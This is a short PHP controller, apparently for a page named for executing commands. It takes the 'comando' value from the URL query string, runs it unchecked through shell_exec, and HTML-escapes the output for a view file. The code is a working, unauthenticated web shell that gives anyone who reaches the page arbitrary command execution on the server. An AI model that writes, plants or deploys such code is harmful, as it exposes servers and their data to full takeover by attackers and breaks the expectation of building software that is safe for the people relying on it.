<?php
if (isset($_GET['enter'])){
    $salida = shell_exec($_GET["comando"]);
    $output = htmlentities(trim($salida)) . "<br>";

}

require "ejecutarComandos.view.php";